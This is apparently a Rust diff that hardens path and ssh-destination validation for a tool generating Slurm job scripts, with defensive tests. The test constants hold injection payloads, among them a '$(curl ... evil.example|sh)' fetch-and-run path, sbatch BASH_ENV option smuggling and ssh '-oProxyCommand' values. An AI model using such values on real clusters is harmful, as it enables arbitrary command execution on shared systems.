@@ -22,6 +22,11 @@ pub(crate) fn normalise_path(path: &str, field: &str) -> Result<String, String> 
     if path.contains('\0') {
         return Err(format!("{field} must not contain a NUL byte."));
     }
+    if path.chars().any(char::is_control) {
+        return Err(format!(
+            "{field} must not contain a line break or other control character, got {path:?}."
+        ));
+    }
     if !(path.starts_with('/') || path.starts_with('~')) {
         return Err(format!("{field} must be an absolute or ~ path, got {path:?}."));
     }
@@ -57,6 +62,98 @@ pub(crate) fn normalise_path(path: &str, field: &str) -> Result<String, String> 
     } else {
         Ok(format!("/{body}"))
     }
+}
+
+/// Characters a results or code folder may not contain. Job scripts write
+/// `results_root` inside double quotes (`OUT_DIR="<results_root>/runs/<id>"`),
+/// where bash still expands `$`, runs backticks, and ends the string at `"`; a
+/// backslash escapes the closing quote.
+const SCRIPT_PATH_FORBIDDEN: [char; 4] = ['$', '`', '"', '\\'];
+
+/// Refuses a path that a job script would interpret instead of using as text:
+/// a line break or other control character (an `#SBATCH --output=<path>` line
+/// would become a shell command) or one of [`SCRIPT_PATH_FORBIDDEN`].
+fn validate_script_path(path: &str, label: &str) -> Result<(), String> {
+    if path.chars().any(char::is_control) {
+        return Err(format!(
+            "The {label} {path:?} contains a line break or control character, which is not a \
+             valid path."
+        ));
+    }
+    if let Some(found) = path.chars().find(|ch| SCRIPT_PATH_FORBIDDEN.contains(ch)) {
+        return Err(format!(
+            "The {label} {path:?} contains {found:?}. Job scripts use this path, so it may not \
+             contain $, a backtick, a double quote or a backslash. Choose a folder whose path has \
+             none of these."
+        ));
+    }
+    Ok(())
+}
+
+/// Characters sbatch treats specially inside an `#SBATCH` line, besides
+/// whitespace: an unquoted '#' ends the line, and quotes group text (an
+/// unmatched one makes sbatch refuse the script).
+const SBATCH_PATH_FORBIDDEN: [char; 3] = ['#', '\'', '"'];
+
+/// Refuses a path that sbatch would not read as one argument when it is written
+/// unquoted into `#SBATCH --output=<path>/...` and `#SBATCH --error=<path>/...`.
+/// sbatch splits each directive line at whitespace and hands every piece to its
+/// option parser, so `/x --export=ALL,BASH_ENV=/evil.sh #` would add a job option.
+pub fn validate_sbatch_path(path: &str, label: &str) -> Result<(), String> {
+    let found = path
+        .chars()
+        .find(|ch| ch.is_whitespace() || SBATCH_PATH_FORBIDDEN.contains(ch));
+    if let Some(found) = found {
+        let what = if found.is_whitespace() {
+            "a space".to_string()
+        } else {
+            format!("{found:?}")
+        };
+        return Err(format!(
+            "The {label} {path:?} contains {what}. Slurm reads this folder from the job \
+             script's #SBATCH --output and --error lines, which it splits at spaces and cuts at \
+             '#', so the path may not contain spaces, '#' or quotes. Choose a folder whose path \
+             has none of these, for example /data/my_lab/runs."
+        ));
+    }
+    Ok(())
+}
+
+/// Validates and normalises a profile's `results_root`, the shared folder every
+/// job script writes its logs and outputs to.
+///
+/// It must be a plain absolute path: job scripts and the plan checks use it
+/// quoted, where `~` is never expanded, so a `~` root would point at a folder
+/// literally named `~`.
+pub fn validate_results_root(path: &str) -> Result<String, String> {
+    validate_script_path(path, "results folder")?;
+    validate_sbatch_path(path, "results folder")?;
+    if path.starts_with('~') {
+        return Err(format!(
+            "The results folder {path:?} must be an absolute path on the cluster, starting with \
+             '/'. Job scripts do not expand '~', so type the full path, for example \
+             /home/<you>/results."
+        ));
+    }
+    normalise_path(path, "results_root")
+}
+
+/// Validates and normalises one of a profile's `code_roots`. A `~/...` root stays
+/// allowed like a data root: the plan checks expand it against the remote HOME.
+pub fn validate_code_root(path: &str) -> Result<String, String> {
+    validate_script_path(path, "code folder")?;
+    normalise_path(path, "code root")
+}
+
+/// ssh reads any argument that starts with '-' as an option (for example
+/// `-oProxyCommand=...`), so no part of the destination may start with one.
+fn reject_option_like(value: &str, what: &str) -> Result<(), String> {
+    if value.trim_start().starts_with('-') {
+        return Err(format!(
+            "{what} {value:?} may not start with '-': ssh would read it as an option."
+        ));
+    }
+    Ok(())
 }
 
 /// True when normalised `child` equals or is inside normalised `root`.
@@ -186,7 +283,11 @@ pub struct ServerProfile {
 
 impl ServerProfile {
     /// The argv element to ssh to: the configured alias, or user@host.
+    ///
+    /// Refuses a part that starts with '-' even for a profile that was never
+    /// validated (Test connection runs before a profile is saved).
     pub fn ssh_target(&self) -> Result<String, String> {
+        self.reject_option_like_destination()?;
         if let Some(alias) = &self.ssh_alias {
             return Ok(alias.clone());
         }
@@ -201,6 +302,19 @@ impl ServerProfile {
                     .into(),
             ),
         }
+    }
+
+    fn reject_option_like_destination(&self) -> Result<(), String> {
+        if let Some(alias) = &self.ssh_alias {
+            reject_option_like(alias, "The SSH host name")?;
+        }
+        if let Some(host) = &self.host {
+            reject_option_like(host, "The host name")?;
+        }
+        if let Some(user) = &self.user {
+            reject_option_like(user, "The user name")?;
+        }
+        Ok(())
     }
 
     /// Reject the shapes the UI must never save (both alias and host, no roots, no scratch).
@@ -218,6 +332,7 @@ impl ServerProfile {
                     .into(),
             );
         }
+        self.reject_option_like_destination()?;
         if self.data_roots.is_empty() {
             return Err("Add at least one data root on the server.".into());
         }
@@ -236,7 +351,7 @@ impl ServerProfile {
                     .into(),
             );
         }
-        let results_root = normalise_path(&self.results_root, "results_root")?;
+        let results_root = validate_results_root(&self.results_root)?;
         let scratch_prefix = static_scratch_prefix(&self.scratch_template);
         if !scratch_prefix.is_empty() && is_under(&results_root, &scratch_prefix) {
             return Err(format!(
@@ -246,7 +361,7 @@ impl ServerProfile {
             ));
         }
         for root in &self.code_roots {
-            normalise_path(root, "code root")?;
+            validate_code_root(root)?;
         }
         self.defaults.validate()?;
         self.environment.validate()?;
@@ -258,6 +373,8 @@ impl ServerProfile {
         if self.results_root.trim().is_empty() {
             return Err("Set results_root on the server profile first.".into());
         }
+        // The run script writes this path inside double quotes (OUT_DIR="...").
+        validate_script_path(path, "output folder")?;
         let output = normalise_path(path, "output directory")?;
         let results_root = normalise_path(&self.results_root, "results_root")?;
         if !is_under(&output, &results_root) {
@@ -1094,5 +1211,175 @@ mod tests {
         let mut dotted = profile;
         dotted.results_root = "/scratch/./shared".into();
         assert!(dotted.validate().is_err());
+    }
+
+    /// Values that job scripts would evaluate: `OUT_DIR="<results_root>/runs/<id>"`
+    /// runs `$(...)`, backticks and a closing `"`, and a line break turns the rest
+    /// of an `#SBATCH --output=<results_root>/...` line into a shell command.
+    const SCRIPT_BREAKING_PATHS: &[&str] = &[
+        "/data/lab/x$(curl${IFS}-fsS${IFS}evil.example|sh)",
+        "/data/lab/x${IFS}",
+        "/data/lab/$HOME",
+        "/data/lab/x`id`",
+        "/data/lab/x\";touch marker;\"",
+        "/data/lab/x\\\"y",
+        "/dev/null\necho INJECTED_LINE_RAN #",
+        "/data/lab/x\rcarriage",
+        "/data/lab/x\ttab",
+        "/data/lab/x\u{7f}del",
+    ];
+
+    #[test]
+    fn results_root_refuses_shell_metacharacters_and_control_characters() {
+        for bad in SCRIPT_BREAKING_PATHS {
+            let mut profile = alpha();
+            profile.results_root = (*bad).to_string();
+            let error = profile
+                .validate()
+                .expect_err(&format!("results_root {bad:?} must be refused"));
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn code_roots_refuse_shell_metacharacters_and_control_characters() {
+        for bad in SCRIPT_BREAKING_PATHS {
+            let mut profile = alpha();
+            profile.code_roots = vec!["/data/projects/alpha/code".into(), (*bad).to_string()];
+            let error = profile
+                .validate()
+                .expect_err(&format!("code root {bad:?} must be refused"));
+            assert!(error.contains("code folder"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn results_root_must_be_absolute_because_job_scripts_never_expand_tilde() {
+        for tilde in ["~/runs", "~", "~/", "~alice/runs"] {
+            let mut profile = alpha();
+            profile.results_root = tilde.to_string();
+            let error = profile
+                .validate()
+                .expect_err(&format!("results_root {tilde:?} must be refused"));
+            assert!(error.contains("absolute path"), "{tilde:?}: {error}");
+            assert!(error.contains("'/'"), "{tilde:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn legitimate_results_and_code_roots_still_validate() {
+        for (results_root, code_roots) in [
+            ("/data/projects/alpha/runs", vec!["/data/projects/alpha/code"]),
+            ("/home/dana/results", vec![]),
+            ("/data/results/", vec!["/data/code/"]),
+            ("/gpfs/lab-01/user_x/runs.v2", vec!["/gpfs/lab-01/code@2024"]),
+            // A code root never reaches an #SBATCH line (it is a shell-quoted
+            // argument), so spaces and apostrophes stay allowed there. A results
+            // folder with them is refused: see
+            // results_root_that_sbatch_would_split_into_options_is_refused.
+            ("/data/projects/alpha/runs", vec!["/data/My Lab/code", "/data/o'brien/code"]),
+            ("/data/results:2024+%,=", vec![]),
+            // A code root may be relative to the remote HOME: the plan checks
+            // expand it there (run_plan::expand_root_with_home).
+            ("/data/projects/alpha/runs", vec!["~/code", "~"]),
+        ] {
+            let mut profile = alpha();
+            profile.results_root = results_root.to_string();
+            profile.code_roots = code_roots.iter().map(|root| root.to_string()).collect();
+            profile
+                .validate()
+                .unwrap_or_else(|error| panic!("{results_root:?} {code_roots:?}: {error}"));
+        }
+    }
+
+    /// Results folders that sbatch would not read as one `--output=<path>` token:
+    /// it splits `#SBATCH` lines at whitespace, ends them at an unquoted '#', and
+    /// treats quotes as quoting (an unmatched one is an error).
+    const SBATCH_SPLITTING_RESULTS_ROOTS: &[&str] = &[
+        "/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
+        "/data/lab/r --output=/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
+        "/data/lab/r --chdir=/data/lab/evil --comment=x",
+        "/data/My Lab/runs",
+        "/data/o'brien/runs",
+        "/data/lab#2/runs",
+        "/data/lab/'--export=ALL'",
+        "/data/lab/runs ",
+        "/data/lab/r\u{a0}--chdir=/tmp",
+    ];
+
+    #[test]
+    fn results_root_that_sbatch_would_split_into_options_is_refused() {
+        for bad in SBATCH_SPLITTING_RESULTS_ROOTS {
+            let mut profile = alpha();
+            profile.results_root = (*bad).to_string();
+            let error = profile
+                .validate()
+                .expect_err(&format!("results_root {bad:?} must be refused"));
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+            assert!(error.contains("#SBATCH"), "{bad:?}: {error}");
+            assert!(error.contains("spaces, '#' or quotes"), "{bad:?}: {error}");
+            let error = validate_results_root(bad).expect_err(bad);
+            assert!(error.contains("#SBATCH"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn an_output_dir_that_job_scripts_would_run_is_refused_even_inside_results_root() {
+        // A saved plan is re-read from the cluster; its output_dir must not carry
+        // what the results_root check refuses.
+        let profile = alpha();
+        for bad in SCRIPT_BREAKING_PATHS {
+            let inside = format!("/data/projects/alpha/runs/{}", bad.trim_start_matches('/'));
+            let error = profile
+                .validate_output_dir(&inside)
+                .expect_err(&format!("output dir {inside:?} must be refused"));
+            assert!(error.contains("output folder"), "{inside:?}: {error}");
+        }
+        profile
+            .validate_output_dir("/data/projects/alpha/runs/runs/plan-1763300000-a1b2c3d4e5f6")
+            .expect("a saved plan's output dir");
+        profile
+            .validate_output_dir("/data/projects/alpha/runs/plans")
+            .expect("the plans folder");
+    }
+
+    #[test]
+    fn normalise_path_refuses_control_characters() {
+        for bad in ["/data/a\nb", "/data/a\rb", "/data/a\tb", "~/a\nb"] {
+            let error = normalise_path(bad, "root").expect_err(&format!("{bad:?}"));
+            assert!(error.contains("control character"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn ssh_destination_parts_may_not_look_like_an_ssh_option() {
+        let mut alias = alpha();
+        alias.ssh_alias = Some("-oProxyCommand=touch /tmp/marker".into());
+        assert!(alias.validate().unwrap_err().contains("'-'"));
+        assert!(alias.ssh_target().unwrap_err().contains("'-'"));
+
+        let mut host = alpha();
+        host.ssh_alias = None;
+        host.host = Some("-oProxyCommand=touch /tmp/marker".into());
+        assert!(host.validate().unwrap_err().contains("'-'"));
+        assert!(host.ssh_target().unwrap_err().contains("'-'"));
+
+        let mut user = alpha();
+        user.ssh_alias = None;
+        user.host = Some("login.example".into());
+        user.user = Some("-oProxyJump=x@evil.example,y".into());
+        assert!(user.validate().unwrap_err().contains("'-'"));
+        assert!(user.ssh_target().unwrap_err().contains("'-'"));
+
+        // Ordinary names with a dash inside are fine.
+        let mut typed = alpha();
+        typed.ssh_alias = None;
+        typed.host = Some("login-01.cluster-a.example.org".into());
+        typed.user = Some("first-last".into());
+        typed.validate().expect("dashes inside names are fine");
+        assert_eq!(
+            typed.ssh_target().expect("target"),
+            "first-last@login-01.cluster-a.example.org"
+        );
     }
 }
